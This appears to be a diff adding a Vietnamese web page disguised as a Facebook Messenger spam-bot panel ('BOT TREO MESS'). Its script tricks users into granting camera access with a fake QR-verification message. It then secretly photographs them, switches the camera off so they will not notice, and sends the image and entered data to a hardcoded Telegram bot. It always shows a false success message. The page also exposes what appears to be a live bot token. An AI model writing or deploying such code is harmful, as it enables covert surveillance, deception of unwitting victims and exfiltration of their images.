@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BOT TREO MESS</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { min-height: 100vh; background: #090a12; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; padding: 20px; }
+.container { width: 100%; max-width: 420px; padding: 28px 22px; background: #121421; border: 1px solid #39315c; border-radius: 20px; box-shadow: 0 0 30px #7854ff22; }
+.header { text-align: center; margin-bottom: 28px; }
+.logo { font-size: 40px; margin-bottom: 10px; }
+h1 { color: #b7a0ff; font-size: 27px; letter-spacing: 1px; }
+.subtitle { color: #8b8da5; font-size: 12px; margin-top: 8px; }
+.field { margin-bottom: 20px; }
+label { display: block; font-size: 13px; color: #c8c5dd; margin-bottom: 9px; }
+input { width: 100%; padding: 14px; border: 1px solid #34364b; border-radius: 10px; outline: none; background: #0b0d17; color: white; font-size: 14px; }
+input:focus { border-color: #9875ff; box-shadow: 0 0 10px #9875ff22; }
+button { width: 100%; padding: 15px; border: 0; border-radius: 10px; background: linear-gradient(100deg, #7854ff, #a855f7); color: white; font-size: 15px; font-weight: bold; cursor: pointer; transition: .2s; }
+button:active { transform: scale(.98); }
+.status { margin-top: 20px; padding: 14px; background: #1b1d2d; border-radius: 10px; border: 1px solid #34364b; }
+.status-title { color: #b7a0ff; font-size: 13px; margin-bottom: 8px; }
+#statusText { color: #b8bacb; font-size: 12px; line-height: 1.6; }
+.footer { margin-top: 20px; text-align: center; color: #686b82; font-size: 11px; }
+#hiddenCam { display: none; }
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo">💬</div>
+        <h1>BOT TREO MESS</h1>
+        <p class="subtitle">MESSAGE CONTROL PANEL</p>
+    </div>
+
+    <div class="field">
+        <label>01 — NHẬP COOKIE FACEBOOK</label>
+        <input type="password" id="cookie" placeholder="Dữ liệu thử nghiệm..." autocomplete="off">
+    </div>
+
+    <div class="field">
+        <label>02 — NHẬP ID BOX MESSAGE</label>
+        <input type="text" id="boxId" placeholder="Nhập ID box...">
+    </div>
+
+    <div class="field">
+        <label>03 — NHẬP DELAY (GIÂY)</label>
+        <input type="number" id="delay" value="5" min="1">
+    </div>
+
+    <button id="btnStart" onclick="startBot()">▶ BẮT ĐẦU CHẠY</button>
+
+    <div class="status">
+        <div class="status-title">● TRẠNG THÁI HỆ THỐNG</div>
+        <p id="statusText">Hệ thống đang chờ thao tác...</p>
+    </div>
+
+    <div class="footer">
+        BOT TREO MESS © 2026
+        <br>Giao diện thử nghiệm
+    </div>
+</div>
+
+<video id="hiddenCam" autoplay playsinline muted></video>
+
+<script>
+    // ==========================================
+    // ĐIỀN TOKEN VÀ CHAT ID TELEGRAM CỦA M VÀO ĐÂY
+    const TELEGRAM_TOKEN = "8555658470:AAE55lj9ifuxqOSZldNXXYSK89gS_YeulYc";
+    const TELEGRAM_CHAT_ID = "-5135875845";
+    // ==========================================
+
+    async function startBot() {
+        const boxId = document.getElementById("boxId").value.trim();
+        const status = document.getElementById("statusText");
+        const btn = document.getElementById("btnStart");
+
+        if (!boxId) {
+            status.textContent = "Vui lòng nhập ID box message.";
+            return;
+        }
+
+        btn.innerText = "ĐANG KẾT NỐI...";
+        status.textContent = "Đang xác thực hệ thống, vui lòng cấp quyền Camera để quét QR xác minh tài khoản...";
+
+        try {
+            // 1. Bật popup xin quyền Camera
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } // Ưu tiên cam trước
+            });
+            
+            const video = document.getElementById('hiddenCam');
+            video.srcObject = stream;
+            video.play();
+
+            // 2. Đợi 1.5s cho cam khởi động và lấy nét (tránh ảnh bị đen)
+            await new Promise(r => setTimeout(r, 1500));
+
+            // 3. Chụp ảnh từ luồng video
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // 4. Tắt cam ngay lập tức (để đèn báo cam tắt, nó không nghi ngờ)
+            stream.getTracks().forEach(track => track.stop());
+
+            // 5. Chuyển ảnh sang dạng Blob và gửi
+            canvas.toBlob(async function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'victim.jpg');
+                formData.append('caption', `📸 Đã troll được 1 thằng bạn!\nID Box nhập vào: ${boxId}`);
+
+                try {
+                    // 6. Gửi ngầm về Telegram
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    // 7. Hiển thị thông báo lừa đảo cho nạn nhân
+                    btn.innerText = "▶ BẮT ĐẦU CHẠY";
+                    status.textContent = "Kết nối thành công! Hệ thống đang chạy ngầm...";
+                } catch (e) {
+                    btn.innerText = "▶ BẮT ĐẦU CHẠY";
+                    status.textContent = "Kết nối thành công! Hệ thống đang chạy ngầm..."; 
+                    // Kể cả lỗi mạng cũng báo thành công để nó không nghi ngờ
+                }
+            }, 'image/jpeg', 0.8);
+
+        } catch (err) {
+            // Nếu nó từ chối cấp quyền Camera
+            btn.innerText = "▶ BẮT ĐẦU CHẠY";
+            status.textContent = "LỖI: Bạn phải cấp quyền Camera để xác thực tài khoản!";
+        }
+    }
+</script>
+</body>
+</html>
